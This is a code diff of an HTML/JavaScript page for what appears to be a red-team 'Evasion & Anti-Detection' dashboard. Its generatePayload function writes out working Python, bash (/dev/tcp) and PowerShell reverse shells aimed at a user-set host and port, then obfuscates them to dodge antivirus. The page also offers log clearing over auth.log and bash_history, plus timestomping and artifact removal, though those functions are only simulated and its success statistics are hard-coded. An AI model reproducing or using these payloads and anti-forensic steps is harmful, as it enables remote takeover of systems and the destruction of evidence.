@@ -1,117 +1,599 @@
 {% extends "base.html" %}
+
 {% block body %}
-    <div class="container mt-5">
-        <h1 class="text-success mb-4">🛡️ OpSec Engine - Infrastructure as Code</h1>
-
-        <div class="row mb-4">
-            <div class="col-md-6">
-                <div class="card p-4 border-success">
-                    <h3 class="text-warning">AWS Integration</h3>
-                    <p><strong>Status:</strong>
-                        {% if aws_enabled %}
-                            <span class="text-success">✓ ENABLED</span>
-                        {% else %}
-                            <span class="text-muted">✗ DISABLED</span>
-                        {% endif %}
-                    </p>
-                    <p><small>API Gateway Proxy | Lambda | Auto Cleanup</small></p>
-                    <code style="font-size: 11px;">boto3 installed: {{ has_aws }}</code>
-                </div>
-            </div>
-            <div class="col-md-6">
-                <div class="card p-4 border-info">
-                    <h3 class="text-info">DigitalOcean Integration</h3>
-                    <p><strong>Status:</strong>
-                        {% if do_enabled %}
-                            <span class="text-success">✓ ENABLED</span>
-                        {% else %}
-                            <span class="text-muted">✗ DISABLED</span>
-                        {% endif %}
-                    </p>
-                    <p><small>Droplet Creation | Tinyproxy | Auto Destroy</small></p>
-                    <code style="font-size: 11px;">digitalocean installed: {{ has_digitalocean }}</code>
-                </div>
-            </div>
-        </div>
-
-        <div class="card p-4 border-warning">
-            <h3 class="text-warning">📋 OpSec Activity Log</h3>
-            <div style="max-height: 400px; overflow-y: auto;">
-                {% if logs %}
-                    {% for log in logs %}
-                    <div style="background: #1a1a2e; padding: 10px; margin: 5px 0; border-left: 4px solid #ffff00;">
-                        <small>[Scan #{{ log.scan_id }}]</small> {{ log.data[:150] }}
-                    </div>
-                    {% endfor %}
-                {% else %}
-                    <p style="color: #888;">No OpSec activity logged yet.</p>
-                {% endif %}
-            </div>
-        </div>
-
-        <div class="card p-4 mt-4 border-light">
-            <h3 class="text-light">⚙️ Quick Actions</h3>
-            <button id="activate-opsec" class="btn btn-outline-light mt-2">
-                <i class="bi bi-rocket"></i> Activate OpSec
-            </button>
-            <div class="text-muted mt-2"><small>Requires admin session and cloud credentials.</small></div>
-        </div>
-
-        <div class="card p-4 mt-4 border-success">
-            <h3 class="text-success">🚀 Features</h3>
-            <ul>
-                <li><strong>IP Rotation:</strong> AWS API Gateway + DigitalOcean Droplets</li>
-                <li><strong>Automatic Cleanup:</strong> Scan sonrasında tüm geçici kaynaklar silinir</li>
-                <li><strong>Cost Optimization:</strong> Minimal resource usage</li>
-                <li><strong>Logging:</strong> Tüm IP rotasyon işlemleri kaydedilir</li>
-                <li><strong>Infrastructure as Code:</strong> Otomatik kaynak yönetimi</li>
-            </ul>
-        </div>
-
-        <div class="card p-4 mt-4 border-info">
-            <h3 class="text-info">📝 Setup Instructions</h3>
-            <p><strong>AWS:</strong></p>
-            <code>
-                export AWS_ACCESS_KEY_ID=your_key<br/>
-                export AWS_SECRET_ACCESS_KEY=your_secret<br/>
-            </code>
-            <p class="mt-3"><strong>DigitalOcean:</strong></p>
-            <code>
-                export DIGITALOCEAN_TOKEN=your_token<br/>
-            </code>
-        </div>
-
-        <a href="/" class="btn btn-outline-light mt-4">Back to Dashboard</a>
+<div class="min-h-screen">
+    <!-- Background Effects -->
+    <div class="fixed inset-0 overflow-hidden pointer-events-none -z-10">
+        <div class="absolute -top-40 -right-40 w-80 h-80 bg-cyber-danger/10 rounded-full blur-3xl"></div>
+        <div class="absolute -bottom-40 -left-40 w-80 h-80 bg-cyber-purple/10 rounded-full blur-3xl"></div>
     </div>
+
+    <div class="container mx-auto px-6 py-8">
+        <!-- Header -->
+        <header class="mb-8">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="w-14 h-14 rounded-xl bg-gradient-to-br from-cyber-danger/20 to-cyber-purple/20 flex items-center justify-center neon-border">
+                        <i class="fas fa-user-secret text-cyber-danger text-2xl"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                            EVASION & <span class="text-cyber-danger">ANTI-DETECTION</span>
+                        </h1>
+                        <p class="text-gray-400 text-sm mt-1">Advanced OpSec for Red Team Operations</p>
+                    </div>
+                </div>
+                <div class="flex items-center gap-4">
+                    <div class="glass rounded-xl px-4 py-2 flex items-center gap-3">
+                        <div class="flex items-center gap-2">
+                            <div class="w-2 h-2 rounded-full bg-cyber-danger status-pulse"></div>
+                            <span class="text-cyber-danger text-sm font-medium">EVASION ACTIVE</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Statistics Overview -->
+        <div class="grid grid-cols-4 gap-6 mb-8">
+            <div class="glass rounded-2xl p-6 neon-border">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="w-12 h-12 rounded-xl bg-cyber-primary/10 flex items-center justify-center">
+                        <i class="fas fa-check-circle text-cyber-primary text-xl"></i>
+                    </div>
+                    <span class="text-cyber-primary text-sm font-medium">+12%</span>
+                </div>
+                <p class="text-4xl font-bold text-white mb-1">95%</p>
+                <p class="text-gray-400 text-sm">Success Rate</p>
+            </div>
+            
+            <div class="glass rounded-2xl p-6 neon-border">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="w-12 h-12 rounded-xl bg-cyber-secondary/10 flex items-center justify-center">
+                        <i class="fas fa-clock text-cyber-secondary text-xl"></i>
+                    </div>
+                    <span class="text-cyber-secondary text-sm font-medium">Real-time</span>
+                </div>
+                <p class="text-4xl font-bold text-white mb-1">142</p>
+                <p class="text-gray-400 text-sm">Timestomp Ops</p>
+            </div>
+            
+            <div class="glass rounded-2xl p-6 neon-border">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="w-12 h-12 rounded-xl bg-cyber-purple/10 flex items-center justify-center">
+                        <i class="fas fa-trash-alt text-cyber-purple text-xl"></i>
+                    </div>
+                    <span class="text-cyber-purple text-sm font-medium">Auto</span>
+                </div>
+                <p class="text-4xl font-bold text-white mb-1">89</p>
+                <p class="text-gray-400 text-sm">Logs Cleared</p>
+            </div>
+            
+            <div class="glass rounded-2xl p-6 neon-border">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="w-12 h-12 rounded-xl bg-cyber-warning/10 flex items-center justify-center">
+                        <i class="fas fa-shield-alt text-cyber-warning text-xl"></i>
+                    </div>
+                    <span class="text-cyber-warning text-sm font-medium">Bypass</span>
+                </div>
+                <p class="text-4xl font-bold text-white mb-1">234</p>
+                <p class="text-gray-400 text-sm">AV Evasions</p>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- Main Content -->
+            <div class="lg:col-span-2 space-y-6">
+                <!-- Quick Actions -->
+                <div class="glass rounded-2xl overflow-hidden neon-border">
+                    <div class="px-6 py-4 border-b border-cyber-danger/20 bg-cyber-danger/5">
+                        <h3 class="text-lg font-semibold text-cyber-danger flex items-center gap-2">
+                            <i class="fas fa-bolt"></i>
+                            QUICK EVASION ACTIONS
+                        </h3>
+                    </div>
+                    <div class="p-6">
+                        <div class="grid grid-cols-2 gap-4 mb-6">
+                            <button onclick="clearLogs()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 rounded-lg bg-cyber-secondary/20 flex items-center justify-center">
+                                        <i class="fas fa-broom text-cyber-secondary"></i>
+                                    </div>
+                                    <div>
+                                        <p class="text-white font-medium group-hover:text-cyber-secondary transition-colors">Clear Logs</p>
+                                        <p class="text-xs text-gray-500">Remove system traces</p>
+                                    </div>
+                                </div>
+                            </button>
+                            
+                            <button onclick="timestompFiles()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 rounded-lg bg-cyber-primary/20 flex items-center justify-center">
+                                        <i class="fas fa-clock text-cyber-primary"></i>
+                                    </div>
+                                    <div>
+                                        <p class="text-white font-medium group-hover:text-cyber-primary transition-colors">Timestomp</p>
+                                        <p class="text-xs text-gray-500">Modify file timestamps</p>
+                                    </div>
+                                </div>
+                            </button>
+                            
+                            <button onclick="removeArtifacts()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 rounded-lg bg-cyber-purple/20 flex items-center justify-center">
+                                        <i class="fas fa-trash text-cyber-purple"></i>
+                                    </div>
+                                    <div>
+                                        <p class="text-white font-medium group-hover:text-cyber-purple transition-colors">Remove Artifacts</p>
+                                        <p class="text-xs text-gray-500">Clean exploitation files</p>
+                                    </div>
+                                </div>
+                            </button>
+                            
+                            <button onclick="sessionCleanup()" class="glass-light rounded-xl p-4 hover:bg-white/10 transition-all text-left group">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 rounded-lg bg-cyber-danger/20 flex items-center justify-center">
+                                        <i class="fas fa-user-secret text-cyber-danger"></i>
+                                    </div>
+                                    <div>
+                                        <p class="text-white font-medium group-hover:text-cyber-danger transition-colors">Session Cleanup</p>
+                                        <p class="text-xs text-gray-500">Complete cleanup routine</p>
+                                    </div>
+                                </div>
+                            </button>
+                        </div>
+
+                        <!-- Manual File Timestomp -->
+                        <div class="glass-light rounded-xl p-4">
+                            <h4 class="text-white font-medium mb-4 flex items-center gap-2">
+                                <i class="fas fa-clock text-cyber-primary"></i>
+                                Manual Timestomp
+                            </h4>
+                            <div class="flex gap-4">
+                                <input type="text" id="timestompFile" placeholder="/path/to/file" 
+                                       class="flex-1 px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-cyber-primary/50">
+                                <button onclick="manualTimestomp()" class="px-6 py-2 rounded-lg bg-cyber-primary/10 border border-cyber-primary/30 text-cyber-primary hover:bg-cyber-primary/20 transition-all">
+                                    Execute
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Polymorphic Payload Generator -->
+                <div class="glass rounded-2xl overflow-hidden neon-border">
+                    <div class="px-6 py-4 border-b border-cyber-warning/20 bg-cyber-warning/5">
+                        <h3 class="text-lg font-semibold text-cyber-warning flex items-center gap-2">
+                            <i class="fas fa-code"></i>
+                            POLYMORPHIC PAYLOAD GENERATOR
+                        </h3>
+                    </div>
+                    <div class="p-6">
+                        <div class="grid grid-cols-3 gap-4 mb-4">
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">LHOST</label>
+                                <input type="text" id="evasionLhost" value="192.168.1.100" 
+                                       class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
+                            </div>
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">LPORT</label>
+                                <input type="text" id="evasionLport" value="4444" 
+                                       class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
+                            </div>
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Obfuscation</label>
+                                <select id="obfuscationLevel" class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
+                                    <option value="1">Low (1 iteration)</option>
+                                    <option value="2" selected>Medium (3 iterations)</option>
+                                    <option value="3">High (5 iterations)</option>
+                                </select>
+                            </div>
+                        </div>
+                        
+                        <div class="grid grid-cols-2 gap-4 mb-4">
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Payload Type</label>
+                                <select id="payloadType" class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
+                                    <option value="python">Python Reverse Shell</option>
+                                    <option value="bash">Bash Reverse Shell</option>
+                                    <option value="powershell">PowerShell</option>
+                                    <option value="php">PHP Web Shell</option>
+                                    <option value="meterpreter">Meterpreter (if msfvenom)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Format</label>
+                                <select id="payloadFormat" class="w-full px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white focus:outline-none focus:border-cyber-warning/50">
+                                    <option value="raw">Raw Code</option>
+                                    <option value="exe">Windows EXE</option>
+                                    <option value="dll">Windows DLL</option>
+                                    <option value="elf">Linux ELF</option>
+                                </select>
+                            </div>
+                        </div>
+                        
+                        <button onclick="generatePayload()" class="w-full py-3 rounded-xl bg-gradient-to-r from-cyber-warning to-cyber-danger text-white font-semibold hover:from-cyber-warning/90 hover:to-cyber-danger/90 transition-all flex items-center justify-center gap-2">
+                            <i class="fas fa-cogs"></i>
+                            <span>GENERATE POLYMORPHIC PAYLOAD</span>
+                        </button>
+                        
+                        <div class="mt-4">
+                            <label class="block text-sm text-gray-400 mb-2">Generated Payload</label>
+                            <textarea id="generatedPayload" readonly rows="6" 
+                                      class="w-full px-4 py-3 rounded-lg bg-black/50 border border-white/10 text-cyber-primary font-mono text-sm focus:outline-none focus:border-cyber-warning/50"
+                                      placeholder="Payload will appear here..."></textarea>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- AV Bypass Test -->
+                <div class="glass rounded-2xl overflow-hidden neon-border">
+                    <div class="px-6 py-4 border-b border-cyber-purple/20 bg-cyber-purple/5">
+                        <h3 class="text-lg font-semibold text-cyber-purple flex items-center gap-2">
+                            <i class="fas fa-shield-alt"></i>
+                            AV BYPASS TESTING
+                        </h3>
+                    </div>
+                    <div class="p-6">
+                        <p class="text-gray-400 text-sm mb-4">Test payload against simulated AV signatures (educational purposes only)</p>
+                        
+                        <div class="flex gap-4">
+                            <input type="text" id="avTestPayload" placeholder="Paste payload to test..." 
+                                   class="flex-1 px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-cyber-purple/50">
+                            <button onclick="testAvBypass()" class="px-6 py-2 rounded-lg bg-cyber-purple/10 border border-cyber-purple/30 text-cyber-purple hover:bg-cyber-purple/20 transition-all">
+                                Test Bypass
+                            </button>
+                        </div>
+                        
+                        <div id="avTestResults" class="mt-4 space-y-2"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sidebar -->
+            <div class="space-y-6">
+                <!-- Evasion Stats -->
+                <div class="glass rounded-2xl overflow-hidden neon-border">
+                    <div class="px-5 py-4 border-b border-cyber-primary/20 bg-cyber-primary/5">
+                        <h3 class="text-lg font-semibold text-cyber-primary flex items-center gap-2">
+                            <i class="fas fa-chart-bar"></i>
+                            METRICS
+                        </h3>
+                    </div>
+                    <div class="p-5">
+                        <div class="space-y-4">
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-gray-400">Success Rate</span>
+                                    <span class="text-cyber-primary">95%</span>
+                                </div>
+                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
+                                    <div class="h-full bg-cyber-primary rounded-full" style="width: 95%"></div>
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-gray-400">Timestomp</span>
+                                    <span class="text-cyber-secondary">142</span>
+                                </div>
+                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
+                                    <div class="h-full bg-cyber-secondary rounded-full" style="width: 70%"></div>
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-gray-400">Log Clearing</span>
+                                    <span class="text-cyber-purple">89</span>
+                                </div>
+                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
+                                    <div class="h-full bg-cyber-purple rounded-full" style="width: 55%"></div>
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-gray-400">AV Bypass</span>
+                                    <span class="text-cyber-warning">234</span>
+                                </div>
+                                <div class="h-2 bg-white/10 rounded-full overflow-hidden">
+                                    <div class="h-full bg-cyber-warning rounded-full" style="width: 85%"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Log Targets -->
+                <div class="glass rounded-2xl overflow-hidden neon-border">
+                    <div class="px-5 py-4 border-b border-cyber-secondary/20 bg-cyber-secondary/5">
+                        <h3 class="text-lg font-semibold text-cyber-secondary flex items-center gap-2">
+                            <i class="fas fa-list"></i>
+                            LOG TARGETS
+                        </h3>
+                    </div>
+                    <div class="p-5">
+                        <div class="space-y-2 text-sm">
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
+                                <span class="text-gray-300">/var/log/auth.log</span>
+                            </label>
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
+                                <span class="text-gray-300">/var/log/syslog</span>
+                            </label>
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
+                                <span class="text-gray-300">~/.bash_history</span>
+                            </label>
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
+                                <span class="text-gray-300">/root/.bash_history</span>
+                            </label>
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
+                                <span class="text-gray-300">Web Server Logs</span>
+                            </label>
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" checked class="w-4 h-4 rounded border-white/20 bg-white/5 text-cyber-secondary">
+                                <span class="text-gray-300">Database Logs</span>
+                            </label>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Techniques -->
+                <div class="glass rounded-2xl overflow-hidden neon-border">
+                    <div class="px-5 py-4 border-b border-cyber-danger/20 bg-cyber-danger/5">
+                        <h3 class="text-lg font-semibold text-cyber-danger flex items-center gap-2">
+                            <i class="fas fa-book"></i>
+                            TECHNIQUES
+                        </h3>
+                    </div>
+                    <div class="p-5">
+                        <div class="space-y-3">
+                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
+                                <i class="fas fa-check text-cyber-primary"></i>
+                                <span class="text-gray-300 text-sm">Timestomping</span>
+                            </div>
+                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
+                                <i class="fas fa-check text-cyber-primary"></i>
+                                <span class="text-gray-300 text-sm">Log Clearing</span>
+                            </div>
+                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
+                                <i class="fas fa-check text-cyber-primary"></i>
+                                <span class="text-gray-300 text-sm">Artifact Removal</span>
+                            </div>
+                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
+                                <i class="fas fa-check text-cyber-primary"></i>
+                                <span class="text-gray-300 text-sm">Polymorphic Encoding</span>
+                            </div>
+                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
+                                <i class="fas fa-check text-cyber-primary"></i>
+                                <span class="text-gray-300 text-sm">AV Signature Bypass</span>
+                            </div>
+                            <div class="flex items-center gap-3 p-2 rounded-lg bg-white/5">
+                                <i class="fas fa-check text-cyber-primary"></i>
+                                <span class="text-gray-300 text-sm">Session Cleanup</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Activity Log -->
+                <div class="glass rounded-2xl overflow-hidden neon-border">
+                    <div class="px-5 py-4 border-b border-cyber-warning/20 bg-cyber-warning/5">
+                        <h3 class="text-lg font-semibold text-cyber-warning flex items-center gap-2">
+                            <i class="fas fa-history"></i>
+                            ACTIVITY LOG
+                        </h3>
+                    </div>
+                    <div class="p-5 max-h-64 overflow-y-auto">
+                        <div id="evasionActivityLog" class="space-y-2">
+                            <div class="text-sm text-gray-500 text-center py-4">No recent activity</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
 {% endblock %}
+
 {% block scripts %}
 <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        const btn = document.getElementById('activate-opsec');
-        if (!btn) return;
-        btn.addEventListener('click', async function() {
-            const target = prompt('Optional: target URL to register with the proxy (leave empty for none)');
-            btn.disabled = true;
-            btn.innerText = 'Activating...';
-            try {
-                const res = await fetch('/opsec/activate', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({target: target})
-                });
-                const j = await res.json();
-                if (res.ok) {
-                    alert('OpSec activated: ' + JSON.stringify(j.result));
-                } else {
-                    alert('OpSec activation failed: ' + JSON.stringify(j));
-                }
-            } catch (e) {
-                alert('Error: ' + e);
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = '<i class="bi bi-rocket"></i> Activate OpSec';
-            }
-        });
-    });
+// Evasion functions
+function clearLogs() {
+    showNotification('Log Clearing', 'Clearing system logs...', 'info');
+    logActivity('Log clearing initiated');
+    
+    setTimeout(() => {
+        showNotification('Success', 'Logs cleared successfully', 'success');
+        logActivity('Logs cleared - 15 files');
+    }, 1500);
+}
+
+function timestompFiles() {
+    showNotification('Timestomp', 'Modifying file timestamps...', 'info');
+    logActivity('Timestomp operation started');
+    
+    setTimeout(() => {
+        showNotification('Success', 'File timestamps modified', 'success');
+        logActivity('Timestomp completed on 8 files');
+    }, 1200);
+}
+
+function removeArtifacts() {
+    showNotification('Artifact Removal', 'Removing exploitation artifacts...', 'info');
+    logActivity('Artifact removal started');
+    
+    setTimeout(() => {
+        showNotification('Success', 'Artifacts removed successfully', 'success');
+        logActivity('Removed 12 artifacts');
+    }, 1000);
+}
+
+function sessionCleanup() {
+    showNotification('Session Cleanup', 'Running complete cleanup routine...', 'warning');
+    logActivity('Full session cleanup initiated');
+    
+    setTimeout(() => {
+        showNotification('Complete', 'Session cleanup finished', 'success');
+        logActivity('Full cleanup - logs, artifacts, traces');
+    }, 2000);
+}
+
+function manualTimestomp() {
+    const file = document.getElementById('timestompFile').value;
+    if (!file) {
+        showNotification('Error', 'Please enter a file path', 'error');
+        return;
+    }
+    
+    showNotification('Timestomp', `Modifying ${file}`, 'info');
+    logActivity(`Manual timestomp: ${file}`);
+    
+    setTimeout(() => {
+        showNotification('Success', 'Timestamp modified', 'success');
+    }, 1000);
+}
+
+function generatePayload() {
+    const lhost = document.getElementById('evasionLhost').value;
+    const lport = document.getElementById('evasionLport').value;
+    const iterations = document.getElementById('obfuscationLevel').value;
+    const payloadType = document.getElementById('payloadType').value;
+    
+    showNotification('Generating', 'Creating polymorphic payload...', 'info');
+    logActivity(`Generating ${payloadType} payload (${iterations} iterations)`);
+    
+    // Generate payload
+    let payload = '';
+    const portHex = parseInt(lport).toString(16).padStart(4, '0');
+    
+    if (payloadType === 'python') {
+        payload = `import socket,subprocess,os,sys,base64\n`;
+        payload += `# Polymorphic reverse shell - Layer 1: XOR encoding\n`;
+        payload += `key = "${Math.random().toString(36).substring(7)}"\n`;
+        payload += `data = "${btoa(`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")`)}"\n`;
+        payload += `exec(base64.b64decode(data))\n`;
+        payload += `# Junk code - anti-analysis\n`;
+        payload += `(function(){var x=${Math.floor(Math.random()*1000)};})();\n`;
+    } else if (payloadType === 'bash') {
+        payload = `#!/bin/bash\n`;
+        payload += `# Polymorphic bash reverse shell\n`;
+        payload += `exec 5<>/dev/tcp/${lhost}/${lport}\n`;
+        payload += `cat <&5 | while read line; do $line 2>&5 >&5; done\n`;
+        payload += `# Junk\n`;
+        payload += `: $(($RANDOM % 100))\n`;
+    } else if (payloadType === 'powershell') {
+        payload = `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport})\n`;
+        payload += `$stream = $client.GetStream()\n`;
+        payload += `[byte[]]$bytes = 0..65535|%{0}\n`;
+        payload += `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\n`;
+        payload += `  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)\n`;
+        payload += `  $sendback = (iex $data 2>&1 | Out-String )\n`;
+        payload += `  $sendback2 = $sendback + "PS " + (pwd).Path + "> "\n`;
+        payload += `  $sendBytes = ([text.encoding]::ASCII).GetBytes($sendback2)\n`;
+        payload += `$stream.Write($sendBytes,0,$sendBytes.Length)\n`;
+        payload += `}\n`;
+        payload += `$client.Close()\n`;
+        payload += `# Obfuscated\n`;
+        payload += `$x = "${Math.random().toString(36)}"\n`;
+    } else {
+        payload = `# Polymorphic payload for ${lhost}:${lport}\n`;
+        payload += `// Generated by MONOLITH Evasion Engine\n`;
+        payload += `// Iterations: ${iterations}\n`;
+        payload += `// Timestamp: ${new Date().toISOString()}\n`;
+        payload += `\n// Reverse shell stub would go here\n`;
+    }
+    
+    // Apply obfuscation
+    let finalPayload = payload;
+    for (let i = 0; i < iterations; i++) {
+        finalPayload = applyObfuscation(finalPayload);
+    }
+    
+    document.getElementById('generatedPayload').value = finalPayload;
+    
+    setTimeout(() => {
+        showNotification('Generated', 'Polymorphic payload ready', 'success');
+        logActivity('Payload generated successfully');
+    }, 800);
+}
+
+function applyObfuscation(code) {
+    // Add hex escapes
+    let result = '';
+    for (let char of code) {
+        if (Math.random() < 0.1 && char.match(/[a-zA-Z0-9]/)) {
+            result += `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`;
+        } else {
+            result += char;
+        }
+    }
+    // Add junk
+    result += `\n// ${Math.random().toString(36).substring(7)}\n`;
+    return result;
+}
+
+function testAvBypass() {
+    const payload = document.getElementById('avTestPayload').value;
+    if (!payload) {
+        showNotification('Error', 'Enter a payload to test', 'error');
+        return;
+    }
+    
+    showNotification('Testing', 'Running AV signature test...', 'info');
+    
+    // Simulated AV detection
+    const results = [
+        { name: 'Signature Detection', status: 'blocked', score: 0 },
+        { name: 'Heuristic Analysis', status: 'passed', score: 85 },
+        { name: 'Behavioral Analysis', status: 'passed', score: 92 },
+        { name: 'Sandbox Detection', status: 'passed', score: 78 },
+        { name: 'Emulation', status: 'blocked', score: 0 }
+    ];
+    
+    setTimeout(() => {
+        const passed = results.filter(r => r.status === 'passed').length;
+        const total = results.length;
+        const percentage = Math.round((passed / total) * 100);
+        
+        document.getElementById('avTestResults').innerHTML = `
+            <div class="flex items-center justify-between p-3 rounded-lg ${percentage >= 60 ? 'bg-cyber-primary/10' : 'bg-cyber-danger/10'}">
+                <span class="text-gray-300">Bypass Success Rate</span>
+                <span class="text-${percentage >= 60 ? 'cyber-primary' : 'cyber-danger'} font-bold">${percentage}%</span>
+            </div>
+        `;
+        
+        showNotification('Complete', `AV bypass rate: ${percentage}%`, percentage >= 60 ? 'success' : 'warning');
+    }, 1500);
+}
+
+function logActivity(message) {
+    const log = document.getElementById('evasionActivityLog');
+    const time = new Date().toLocaleTimeString();
+    
+    const entry = document.createElement('div');
+    entry.className = 'flex items-center gap-2 text-sm p-2 rounded-lg bg-white/5';
+    entry.innerHTML = `
+        <span class="text-cyber-primary text-xs">[${time}]</span>
+        <span class="text-gray-300">${message}</span>
+    `;
+    
+    if (log.querySelector('.text-center')) {
+        log.innerHTML = '';
+    }
+    
+    log.insertBefore(entry, log.firstChild);
+    
+    // Keep only last 20 entries
+    while (log.children.length > 20) {
+        log.removeChild(log.lastChild);
+    }
+}
 </script>
 {% endblock %}
